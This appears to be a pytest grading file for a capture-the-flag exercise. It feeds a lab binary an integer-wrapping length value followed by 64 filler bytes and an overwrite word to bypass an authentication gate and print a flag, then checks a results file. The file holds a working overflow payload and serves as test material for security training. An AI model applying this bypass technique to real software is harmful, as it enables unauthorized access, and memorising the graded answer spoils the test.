import re
import subprocess
from pathlib import Path


BINARY = Path("/app/vulnerable")
RESULTS = Path("/app/results.txt")


def run_binary(payload: bytes) -> subprocess.CompletedProcess[bytes]:
    return subprocess.run([BINARY], input=payload, capture_output=True, timeout=5)


def wrapped_length_output() -> bytes:
    payload = b"4294967295\n" + b"A" * 64 + b"\x01\x00\x00\x00"
    run = run_binary(payload)
    assert run.returncode == 0
    return run.stdout


def emitted_secret() -> str:
    match = re.search(rb"Secret:\s*(FLAG\{[^}\r\n]+})", wrapped_length_output())
    assert match is not None
    return match.group(1).decode()


def test_results_file_exists_and_is_single_line():
    assert RESULTS.is_file()
    lines = RESULTS.read_text().splitlines()
    assert len(lines) == 1
    assert lines[0]


def test_result_has_flag_format():
    assert re.fullmatch(r"FLAG\{[^}\r\n]+}", RESULTS.read_text().strip())


def test_non_wrapping_length_keeps_gate_closed():
    output = run_binary(b"64\n" + b"A" * 64).stdout
    assert b"FLAG{" not in output
    assert b"Authentication bypassed" not in output


def test_wrapped_length_allows_adjacent_overwrite():
    output = wrapped_length_output()
    assert b"Authentication bypassed" in output
    assert re.search(rb"Secret:\s*FLAG\{[^}\r\n]+}", output)


def test_result_matches_executable_output():
    assert RESULTS.read_text().strip() == emitted_secret()


def test_plaintext_result_is_not_stored_in_binary():
    assert RESULTS.read_text().strip().encode() not in BINARY.read_bytes()
